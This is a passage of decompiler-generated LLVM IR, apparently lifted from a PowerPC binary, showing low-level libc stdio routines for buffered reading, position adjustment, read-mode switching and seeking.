  %v2_1000e614 = load i16, i16* %v1_1000e614, align 2
  %v3_1000e614 = zext i16 %v2_1000e614 to i32
  store i32 %v3_1000e614, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000e61c = add i32 %v0_1000e614, 8
  %v2_1000e61c = inttoptr i32 %v1_1000e61c to i32*
  %v3_1000e61c = load i32, i32* %v2_1000e61c, align 4
  store i32 %v3_1000e61c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000e624 = and i32 %v3_1000e614, 65464
  store i32 %v1_1000e624, i32* %r0.global-to-local, align 4
  %v3_1000e628 = add i32 %v0_1000e614, 2
  %v4_1000e628 = inttoptr i32 %v3_1000e628 to i8*
  store i8 0, i8* %v4_1000e628, align 1
  %v0_1000e62c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e62c = load i32, i32* @r31, align 4
  %v2_1000e62c = add i32 %v1_1000e62c, 28
  %v3_1000e62c = inttoptr i32 %v2_1000e62c to i32*
  store i32 %v0_1000e62c, i32* %v3_1000e62c, align 4
  %v0_1000e630 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e630 = trunc i32 %v0_1000e630 to i16
  %v2_1000e630 = load i32, i32* @r31, align 4
  %v3_1000e630 = inttoptr i32 %v2_1000e630 to i16*
  store i16 %v1_1000e630, i16* %v3_1000e630, align 2
  %v0_1000e634 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e634 = load i32, i32* @r31, align 4
  %v2_1000e634 = add i32 %v1_1000e634, 16
  %v3_1000e634 = inttoptr i32 %v2_1000e634 to i32*
  store i32 %v0_1000e634, i32* %v3_1000e634, align 4
  %v0_1000e638 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e638 = load i32, i32* @r31, align 4
  %v2_1000e638 = add i32 %v1_1000e638, 20
  %v3_1000e638 = inttoptr i32 %v2_1000e638 to i32*
  store i32 %v0_1000e638, i32* %v3_1000e638, align 4
  %v0_1000e63c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e63c = load i32, i32* @r31, align 4
  %v2_1000e63c = add i32 %v1_1000e63c, 24
  %v3_1000e63c = inttoptr i32 %v2_1000e63c to i32*
  store i32 %v0_1000e63c, i32* %v3_1000e63c, align 4
  %v0_1000e640 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e640 = load i32, i32* @r31, align 4
  %v2_1000e640 = add i32 %v1_1000e640, 44
  %v3_1000e640 = inttoptr i32 %v2_1000e640 to i32*
  store i32 %v0_1000e640, i32* %v3_1000e640, align 4
  br label %dec_label_pc_1000e64c

dec_label_pc_1000e648:                            ; preds = %dec_label_pc_1000e5d0, %dec_label_pc_1000e5fc, %dec_label_pc_1000e5e8
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000e64c

dec_label_pc_1000e64c:                            ; preds = %dec_label_pc_1000e614, %dec_label_pc_1000e648
  %v0_1000e64c = load i32, i32* @r28, align 4
  %v3_1000e64c = icmp eq i32 %v0_1000e64c, 0
  br i1 %v3_1000e64c, label %dec_label_pc_1000e654, label %dec_label_pc_1000e660

dec_label_pc_1000e654:                            ; preds = %dec_label_pc_1000e64c
  %v2_1000e654 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000e654, i32* @r3, align 4
  %v0_1000e65c = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e660

dec_label_pc_1000e660:                            ; preds = %dec_label_pc_1000e64c, %dec_label_pc_1000e584, %dec_label_pc_1000e654
  store i32 %v0_1000e560, i32* %r0.global-to-local, align 4
  %v0_1000e664 = load i32, i32* @r30, align 4
  ret i32 %v0_1000e664

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @__pthread_return_0, { 36, 4, 3, 2, 23, 22, 21, 20, 17, 16, 0, 35, 44, 43, 18, 42, 41, 40, 39, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 19, 29, 28, 27, 31, 30, 38, 26, 37, 1, 25, 24, 34, 33, 32 }
  uselistorder i32 ()* @__pthread_return_void, { 43, 42, 39, 16, 15, 14, 13, 12, 11, 10, 5, 4, 3, 2, 1, 0, 41, 40, 51, 50, 49, 48, 7, 6, 9, 8, 28, 27, 26, 25, 24, 23, 32, 31, 30, 29, 47, 46, 22, 21, 45, 44, 20, 19, 18, 17, 38, 37, 36, 35, 34, 33 }
  uselistorder i32 56, { 1, 4, 3, 0, 2 }
  uselistorder i32 52, { 2, 3, 8, 0, 5, 1, 7, 6, 4 }
  uselistorder i32 22, { 2, 14, 12, 3, 13, 4, 5, 17, 6, 18, 7, 15, 8, 9, 16, 10, 11, 0, 1 }
  uselistorder label %dec_label_pc_1000e660, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e64c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e648, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e5fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5c4, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000e684 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e690 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e698 = and i16 %v3_1000e690, 4
  %v3_1000e698 = icmp eq i16 %v1_1000e698, 0
  br i1 %v3_1000e698, label %dec_label_pc_1000e6a0, label %dec_label_pc_1000e6d8

dec_label_pc_1000e6a0:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_1000e6ac, label %dec_label_pc_1000e6a4

dec_label_pc_1000e6a4:                            ; preds = %dec_label_pc_1000e6a0
  br label %dec_label_pc_1000e6ac

dec_label_pc_1000e6ac:                            ; preds = %dec_label_pc_1000e6a0, %dec_label_pc_1000e6a4
  %v1_1000e6ac = add i32 %tmp, 4
  %v2_1000e6ac = inttoptr i32 %v1_1000e6ac to i32*
  %v3_1000e6ac = load i32, i32* %v2_1000e6ac, align 4
  store i32 %v3_1000e6ac, i32* %r3.global-to-local, align 4
  store i32 268494516, i32* @lr, align 4
  %v1_1000e6b0 = call i32 @__libc_read(i32 %v3_1000e6ac)
  store i32 %v1_1000e6b0, i32* %r3.global-to-local, align 4
  %v2_1000e6b4 = icmp sgt i32 %v1_1000e6b0, 0
  br i1 %v2_1000e6b4, label %dec_label_pc_1000e6d8, label %dec_label_pc_1000e6bc

dec_label_pc_1000e6bc:                            ; preds = %dec_label_pc_1000e6ac
  %v3_1000e6b4 = icmp eq i32 %v1_1000e6b0, 0
  %v0_1000e6bc = load i32, i32* @r31, align 4
  %v1_1000e6bc = inttoptr i32 %v0_1000e6bc to i16*
  %v2_1000e6bc = load i16, i16* %v1_1000e6bc, align 2
  br i1 %v3_1000e6b4, label %dec_label_pc_1000e6c4, label %dec_label_pc_1000e6cc

dec_label_pc_1000e6c4:                            ; preds = %dec_label_pc_1000e6bc
  %v1_1000e6c4 = or i16 %v2_1000e6bc, 4
  br label %dec_label_pc_1000e6d4

dec_label_pc_1000e6cc:                            ; preds = %dec_label_pc_1000e6bc
  %v1_1000e6cc = or i16 %v2_1000e6bc, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e6d4

dec_label_pc_1000e6d4:                            ; preds = %dec_label_pc_1000e6c4, %dec_label_pc_1000e6cc
  %v1_1000e6c4.sink.off0 = phi i16 [ %v1_1000e6c4, %dec_label_pc_1000e6c4 ], [ %v1_1000e6cc, %dec_label_pc_1000e6cc ]
  store i16 %v1_1000e6c4.sink.off0, i16* %v1_1000e6bc, align 2
  %v0_1000e6e8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e6d8

dec_label_pc_1000e6d8:                            ; preds = %entry, %dec_label_pc_1000e6ac, %dec_label_pc_1000e6d4
  %v0_1000e6e8 = phi i32 [ 0, %entry ], [ %v1_1000e6b0, %dec_label_pc_1000e6ac ], [ %v0_1000e6e8.pre, %dec_label_pc_1000e6d4 ]
  store i32 %v0_1000e684, i32* @r31, align 4
  ret i32 %v0_1000e6e8

; uselistorder directives
  uselistorder i16 %v2_1000e6bc, { 1, 0 }
  uselistorder i32 %v1_1000e6b0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32)* @__libc_read, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e6d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e6d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6ac, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg2, i32* @r8, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v3_1000e704 = load i16, i16* %arg1, align 2
  %v4_1000e704 = zext i16 %v3_1000e704 to i32
  %tmp9 = urem i16 %v3_1000e704, 4
  %v3_1000e708 = icmp eq i16 %tmp9, 0
  br i1 %v3_1000e708, label %dec_label_pc_1000e754, label %dec_label_pc_1000e710

dec_label_pc_1000e710:                            ; preds = %entry
  %v1_1000e708 = zext i16 %tmp9 to i32
  %v1_1000e710 = add nsw i32 %v1_1000e708, -1
  store i32 %v1_1000e710, i32* %r10.global-to-local, align 4
  %v4_1000e710 = icmp eq i32 %v1_1000e710, 0
  br i1 %v4_1000e710, label %dec_label_pc_1000e754, label %dec_label_pc_1000e718

dec_label_pc_1000e718:                            ; preds = %dec_label_pc_1000e710
  %v1_1000e718 = and i32 %v4_1000e704, 2048
  %v3_1000e718 = icmp eq i32 %v1_1000e718, 0
  br i1 %v3_1000e718, label %dec_label_pc_1000e754, label %dec_label_pc_1000e720

dec_label_pc_1000e720:                            ; preds = %dec_label_pc_1000e718
  %v2_1000e720 = icmp sgt i32 %v1_1000e710, 1
  br i1 %v2_1000e720, label %dec_label_pc_1000e7cc, label %dec_label_pc_1000e728

dec_label_pc_1000e728:                            ; preds = %dec_label_pc_1000e720
  %v2_1000e728 = add i32 %tmp, 40
  %v3_1000e728 = inttoptr i32 %v2_1000e728 to i32*
  %v4_1000e728 = load i32, i32* %v3_1000e728, align 4
  %v3_1000e72c = icmp eq i32 %v4_1000e728, 0
  br i1 %v3_1000e72c, label %dec_label_pc_1000e734, label %dec_label_pc_1000e7cc

dec_label_pc_1000e734:                            ; preds = %dec_label_pc_1000e728
  %v2_1000e734 = add i32 %tmp, 44
  %v3_1000e734 = inttoptr i32 %v2_1000e734 to i32*
  %v4_1000e734 = load i32, i32* %v3_1000e734, align 4
  %v2_1000e738 = add i32 %tmp, 3
  %v3_1000e738 = inttoptr i32 %v2_1000e738 to i8*
  %v4_1000e738 = load i8, i8* %v3_1000e738, align 1
  %v5_1000e738 = zext i8 %v4_1000e738 to i32
  %v2_1000e740 = sub nsw i32 %v1_1000e710, %v5_1000e738
  %v1_1000e744 = add nsw i32 %v2_1000e740, -1
  store i32 %v1_1000e744, i32* %r10.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_1000e734, 1
  br i1 %tmp7, label %dec_label_pc_1000e754, label %dec_label_pc_1000e74c

dec_label_pc_1000e74c:                            ; preds = %dec_label_pc_1000e734
  %v2_1000e74c = add i32 %tmp, 2
  %v3_1000e74c = inttoptr i32 %v2_1000e74c to i8*
  %v4_1000e74c = load i8, i8* %v3_1000e74c, align 1
  %v5_1000e74c = zext i8 %v4_1000e74c to i32
  %v2_1000e750 = sub nsw i32 %v1_1000e744, %v5_1000e74c
  store i32 %v2_1000e750, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000e754

dec_label_pc_1000e754:                            ; preds = %dec_label_pc_1000e734, %dec_label_pc_1000e718, %dec_label_pc_1000e710, %entry, %dec_label_pc_1000e74c
  %v0_1000e778 = phi i32 [ %v1_1000e744, %dec_label_pc_1000e734 ], [ %v1_1000e710, %dec_label_pc_1000e718 ], [ 0, %dec_label_pc_1000e710 ], [ 0, %entry ], [ %v2_1000e750, %dec_label_pc_1000e74c ]
  %v1_1000e754 = and i32 %v4_1000e704, 64
  %v3_1000e754 = icmp eq i32 %v1_1000e754, 0
  %storemerge.in.in.v = select i1 %v3_1000e754, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_1000e768 = add i32 %tmp, 16
  %v3_1000e768 = inttoptr i32 %v2_1000e768 to i32*
  %v4_1000e768 = load i32, i32* %v3_1000e768, align 4
  %v1_1000e76c = inttoptr i32 %arg2 to i32*
  %v2_1000e76c = load i32, i32* %v1_1000e76c, align 4
  store i32 %v2_1000e76c, i32* %r4.global-to-local, align 4
  %v2_1000e770 = sub i32 %storemerge, %v4_1000e768
  %v1_1000e774 = add i32 %arg2, 4
  %v2_1000e774 = inttoptr i32 %v1_1000e774 to i32*
  %v3_1000e774 = load i32, i32* %v2_1000e774, align 4
  store i32 %v3_1000e774, i32* %r5.global-to-local, align 4
  %v2_1000e778 = add i32 %v2_1000e770, %v0_1000e778
  store i32 %v2_1000e778, i32* %r31.global-to-local, align 4
  %tmp10 = icmp slt i32 %v2_1000e778, 0
  %v1_1000e780 = zext i1 %tmp10 to i32
  %v2_1000e780 = ashr i32 %v2_1000e778, 31
  %v3_1000e780 = and i32 %v2_1000e780, -2
  %v4_1000e780 = or i32 %v3_1000e780, %v1_1000e780
  %v2_1000e784 = sub i32 %v3_1000e774, %v2_1000e778
  %v3_1000e784 = sub i32 -1, %v2_1000e778
  store i32 %v2_1000e784, i32* %r10.global-to-local, align 4
  %v6_1000e784 = icmp ule i32 %v2_1000e784, %v3_1000e784
  %v2_1000e788 = sub nsw i32 -1, %v4_1000e780
  %v3_1000e788 = add i32 %v2_1000e76c, %v2_1000e788
  %v5_1000e788 = zext i1 %v6_1000e784 to i32
  %v6_1000e788 = add i32 %v3_1000e788, %v5_1000e788
  store i32 %v6_1000e788, i32* %v1_1000e76c, align 4
  %v0_1000e790 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e790 = load i32, i32* @r8, align 4
  %v2_1000e790 = add i32 %v1_1000e790, 4
  %v3_1000e790 = inttoptr i32 %v2_1000e790 to i32*
  store i32 %v0_1000e790, i32* %v3_1000e790, align 4
  %v0_1000e794 = load i32, i32* @r8, align 4
  %v1_1000e794 = inttoptr i32 %v0_1000e794 to i32*
  %v2_1000e794 = load i32, i32* %v1_1000e794, align 4
  %v1_1000e798 = load i32, i32* %r4.global-to-local, align 4
  %v3_1000e798 = icmp sgt i32 %v2_1000e794, %v1_1000e798
  br i1 %v3_1000e798, label %dec_label_pc_1000e7b0, label %dec_label_pc_1000e7a0

dec_label_pc_1000e7a0:                            ; preds = %dec_label_pc_1000e754
  %v4_1000e798 = icmp eq i32 %v2_1000e794, %v1_1000e798
  br i1 %v4_1000e798, label %dec_label_pc_1000e7a4, label %dec_label_pc_1000e7b4thread-pre-split

dec_label_pc_1000e7a4:                            ; preds = %dec_label_pc_1000e7a0
  %v1_1000e7a4 = add i32 %v0_1000e794, 4
  %v2_1000e7a4 = inttoptr i32 %v1_1000e7a4 to i32*
  %v3_1000e7a4 = load i32, i32* %v2_1000e7a4, align 4
  %v1_1000e7a8 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000e7a8 = icmp ugt i32 %v3_1000e7a4, %v1_1000e7a8
  br i1 %v3_1000e7a8, label %dec_label_pc_1000e7b0, label %dec_label_pc_1000e7b4thread-pre-split

dec_label_pc_1000e7b0:                            ; preds = %dec_label_pc_1000e7a4, %dec_label_pc_1000e754
  %v0_1000e7b0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e7b0 = sub i32 0, %v0_1000e7b0
  store i32 %v1_1000e7b0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e7b4

dec_label_pc_1000e7b4thread-pre-split:            ; preds = %dec_label_pc_1000e7a0, %dec_label_pc_1000e7a4
  %v0_1000e7b4.pr = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e7b4

dec_label_pc_1000e7b4:                            ; preds = %dec_label_pc_1000e7b4thread-pre-split, %dec_label_pc_1000e7b0
  %v0_1000e7b4 = phi i32 [ %v0_1000e7b4.pr, %dec_label_pc_1000e7b4thread-pre-split ], [ %v1_1000e7b0, %dec_label_pc_1000e7b0 ]
  %tmp8 = icmp sgt i32 %v0_1000e7b4, -1
  br i1 %tmp8, label %dec_label_pc_1000e7d0, label %dec_label_pc_1000e7bc

dec_label_pc_1000e7bc:                            ; preds = %dec_label_pc_1000e7b4
  %v0_1000e7bc = call i32 @__errno_location()
  %v2_1000e7c4 = inttoptr i32 %v0_1000e7bc to i32*
  store i32 75, i32* %v2_1000e7c4, align 4
  %v0_1000e7d4.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e7d0

dec_label_pc_1000e7cc:                            ; preds = %dec_label_pc_1000e728, %dec_label_pc_1000e720
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e7d0

dec_label_pc_1000e7d0:                            ; preds = %dec_label_pc_1000e7b4, %dec_label_pc_1000e7bc, %dec_label_pc_1000e7cc
  %v0_1000e7d4 = phi i32 [ %v0_1000e7b4, %dec_label_pc_1000e7b4 ], [ %v0_1000e7d4.pre, %dec_label_pc_1000e7bc ], [ -1, %dec_label_pc_1000e7cc ]
  ret i32 %v0_1000e7d4

; uselistorder directives
  uselistorder i32 %v2_1000e794, { 1, 0 }
  uselistorder i32 %v2_1000e778, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 2048, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000e7d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e7b4thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1000e754, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000e7e8 = load i32, i32* @lr, align 4
  store i32 %v0_1000e7e8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000e7fc = add i32 %arg1, 8
  %v2_1000e7fc = inttoptr i32 %v1_1000e7fc to i32*
  %v3_1000e7fc = load i32, i32* %v2_1000e7fc, align 4
  %v1_1000e800 = add i32 %arg1, 12
  %v2_1000e800 = inttoptr i32 %v1_1000e800 to i32*
  %v3_1000e800 = load i32, i32* %v2_1000e800, align 4
  %v2_1000e804 = sub i32 %v3_1000e800, %v3_1000e7fc
  store i32 268494860, i32* @lr, align 4
  %v3_1000e808 = inttoptr i32 %v3_1000e7fc to i16*
  %v4_1000e808 = call i32 @__stdio_READ(i16* %v3_1000e808, i32 %v2_1000e804, i32 %v2_1000e804)
  %v0_1000e80c = load i32, i32* @r29, align 4
  %v1_1000e80c = add i32 %v0_1000e80c, 8
  %v2_1000e80c = inttoptr i32 %v1_1000e80c to i32*
  %v3_1000e80c = load i32, i32* %v2_1000e80c, align 4
  %v2_1000e810 = add i32 %v3_1000e80c, %v4_1000e808
  store i32 %v2_1000e810, i32* %r0.global-to-local, align 4
  %v2_1000e814 = add i32 %v0_1000e80c, 16
  %v3_1000e814 = inttoptr i32 %v2_1000e814 to i32*
  store i32 %v3_1000e80c, i32* %v3_1000e814, align 4
  %v0_1000e818 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e818 = load i32, i32* @r29, align 4
  %v2_1000e818 = add i32 %v1_1000e818, 20
  %v3_1000e818 = inttoptr i32 %v2_1000e818 to i32*
  store i32 %v0_1000e818, i32* %v3_1000e818, align 4
  store i32 %v0_1000e7e8, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000e808

; uselistorder directives
  uselistorder i32 %v3_1000e80c, { 1, 0 }
  uselistorder i32 %v4_1000e808, { 1, 0 }
  uselistorder i32 %v3_1000e7fc, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_1000e838 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e844 = load i16, i16* %arg1, align 2
  %v4_1000e844 = zext i16 %v3_1000e844 to i32
  %v2_1000e848 = and i32 %v4_1000e844, %arg2
  %v5_1000e848 = icmp eq i32 %v2_1000e848, 0
  br i1 %v5_1000e848, label %dec_label_pc_1000e850, label %dec_label_pc_1000e860

dec_label_pc_1000e850:                            ; preds = %entry
  %v1_1000e850 = and i32 %v4_1000e844, 2176
  %v3_1000e850 = icmp eq i32 %v1_1000e850, 0
  br i1 %v3_1000e850, label %dec_label_pc_1000e858, label %dec_label_pc_1000e86c

dec_label_pc_1000e858:                            ; preds = %dec_label_pc_1000e850
  %v2_1000e858 = or i32 %v4_1000e844, %arg2
  %v1_1000e85c = trunc i32 %v2_1000e858 to i16
  store i16 %v1_1000e85c, i16* %arg1, align 2
  %v0_1000e860.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e860

dec_label_pc_1000e860:                            ; preds = %entry, %dec_label_pc_1000e858
  %v0_1000e860 = phi i32 [ %tmp, %entry ], [ %v0_1000e860.pre, %dec_label_pc_1000e858 ]
  %v1_1000e860 = inttoptr i32 %v0_1000e860 to i16*
  %v2_1000e860 = load i16, i16* %v1_1000e860, align 2
  %v3_1000e860 = zext i16 %v2_1000e860 to i32
  %v1_1000e864 = and i32 %v3_1000e860, 16
  %v3_1000e864 = icmp eq i32 %v1_1000e864, 0
  br i1 %v3_1000e864, label %dec_label_pc_1000e888, label %dec_label_pc_1000e86c

dec_label_pc_1000e86c:                            ; preds = %dec_label_pc_1000e850, %dec_label_pc_1000e860
  %v0_1000e86c = call i32 @__errno_location()
  store i32 %v0_1000e86c, i32* %r3.global-to-local, align 4
  %v2_1000e874 = inttoptr i32 %v0_1000e86c to i32*
  store i32 9, i32* %v2_1000e874, align 4
  br label %dec_label_pc_1000e878

dec_label_pc_1000e878:                            ; preds = %dec_label_pc_1000e890, %dec_label_pc_1000e86c
  %v0_1000e878 = load i32, i32* @r31, align 4
  %v1_1000e878 = inttoptr i32 %v0_1000e878 to i16*
  %v2_1000e878 = load i16, i16* %v1_1000e878, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000e880 = or i16 %v2_1000e878, 8
  br label %dec_label_pc_1000e8bc

dec_label_pc_1000e888:                            ; preds = %dec_label_pc_1000e860
  %v1_1000e888 = and i32 %v3_1000e860, 64
  %v3_1000e888 = icmp eq i32 %v1_1000e888, 0
  br i1 %v3_1000e888, label %dec_label_pc_1000e8b0, label %dec_label_pc_1000e890

dec_label_pc_1000e890:                            ; preds = %dec_label_pc_1000e888
  store i32 268494996, i32* @lr, align 4
  %v0_1000e890 = call i32 @__stdio_wcommit()
  store i32 %v0_1000e890, i32* %r3.global-to-local, align 4
  %v3_1000e894 = icmp eq i32 %v0_1000e890, 0
  br i1 %v3_1000e894, label %dec_label_pc_1000e89c, label %dec_label_pc_1000e878

dec_label_pc_1000e89c:                            ; preds = %dec_label_pc_1000e890
  %v0_1000e89c = load i32, i32* @r31, align 4
  %v1_1000e89c = inttoptr i32 %v0_1000e89c to i16*
  %v2_1000e89c = load i16, i16* %v1_1000e89c, align 2
  %v3_1000e89c = zext i16 %v2_1000e89c to i32
  %v1_1000e8a0 = add i32 %v0_1000e89c, 8
  %v2_1000e8a0 = inttoptr i32 %v1_1000e8a0 to i32*
  %v3_1000e8a0 = load i32, i32* %v2_1000e8a0, align 4
  %v1_1000e8a4 = call i32 @__asm_rlwinm(i32 %v3_1000e89c, i32 0, i32 26, i32 24)
  %v2_1000e8a4 = trunc i32 %v1_1000e8a4 to i16
  %v1_1000e8a8 = load i32, i32* @r31, align 4
  %v2_1000e8a8 = add i32 %v1_1000e8a8, 28
  %v3_1000e8a8 = inttoptr i32 %v2_1000e8a8 to i32*
  store i32 %v3_1000e8a0, i32* %v3_1000e8a8, align 4
  %v3_1000e8ac = load i32, i32* @r31, align 4
  %v4_1000e8ac = inttoptr i32 %v3_1000e8ac to i16*
  store i16 %v2_1000e8a4, i16* %v4_1000e8ac, align 2
  %v0_1000e8b0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e8b0

dec_label_pc_1000e8b0:                            ; preds = %dec_label_pc_1000e888, %dec_label_pc_1000e89c
  %v0_1000e8b0 = phi i32 [ %v0_1000e860, %dec_label_pc_1000e888 ], [ %v0_1000e8b0.pre, %dec_label_pc_1000e89c ]
  %v1_1000e8b0 = inttoptr i32 %v0_1000e8b0 to i16*
  %v2_1000e8b0 = load i16, i16* %v1_1000e8b0, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e8b8 = or i16 %v2_1000e8b0, 1
  br label %dec_label_pc_1000e8bc

dec_label_pc_1000e8bc:                            ; preds = %dec_label_pc_1000e878, %dec_label_pc_1000e8b0
  %v2_1000e8bc = phi i32 [ %v0_1000e878, %dec_label_pc_1000e878 ], [ %v0_1000e8b0, %dec_label_pc_1000e8b0 ]
  %storemerge.off0 = phi i16 [ %v1_1000e880, %dec_label_pc_1000e878 ], [ %v1_1000e8b8, %dec_label_pc_1000e8b0 ]
  %v3_1000e8bc = inttoptr i32 %v2_1000e8bc to i16*
  store i16 %storemerge.off0, i16* %v3_1000e8bc, align 2
  store i32 %v0_1000e838, i32* @r31, align 4
  %v0_1000e8d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e8d0

; uselistorder directives
  uselistorder i32 %v4_1000e844, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32 26, { 4, 2, 5, 6, 3, 7, 8, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 64, { 6, 3, 4, 5, 2, 8, 9, 10, 7, 11, 0, 1 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e8bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e86c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e860, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1000e8d4 = load i32, i32* @lr, align 4
  store i32 %v0_1000e8d4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_1000e8e0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1000e8ec = add i32 %arg1, 4
  %v2_1000e8ec = inttoptr i32 %v1_1000e8ec to i32*
  %v3_1000e8ec = load i32, i32* %v2_1000e8ec, align 4
  %v2_1000e8f0 = load i32, i32* %arg2, align 4
  %v1_1000e8f4 = add i32 %tmp, 4
  %v2_1000e8f4 = inttoptr i32 %v1_1000e8f4 to i32*
  %v3_1000e8f4 = load i32, i32* %v2_1000e8f4, align 4
  store i32 268495100, i32* @lr, align 4
  %v4_1000e8f8 = call i32 @__libc_lseek64(i32 %v3_1000e8ec, i32 %v2_1000e8f0, i32 %v3_1000e8f4, i32 %arg3)
  %v1_1000e8fc = icmp slt i32 %v4_1000e8f8, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1000e8fc, label %dec_label_pc_1000e914, label %dec_label_pc_1000e908

dec_label_pc_1000e908:                            ; preds = %entry
  %v1_1000e908 = load i32, i32* @r31, align 4
  %v2_1000e908 = inttoptr i32 %v1_1000e908 to i32*
  store i32 %v4_1000e8f8, i32* %v2_1000e908, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000e910 = load i32, i32* @r31, align 4
  %v2_1000e910 = add i32 %v1_1000e910, 4
  %v3_1000e910 = inttoptr i32 %v2_1000e910 to i32*
  store i32 %tmp, i32* %v3_1000e910, align 4
  %v0_1000e914.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e914

dec_label_pc_1000e914:                            ; preds = %entry, %dec_label_pc_1000e908
  %v0_1000e914 = phi i32 [ %tmp, %entry ], [ %v0_1000e914.pre, %dec_label_pc_1000e908 ]
  store i32 %v0_1000e8d4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e8e0, i32* @r31, align 4
  ret i32 %v0_1000e914

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
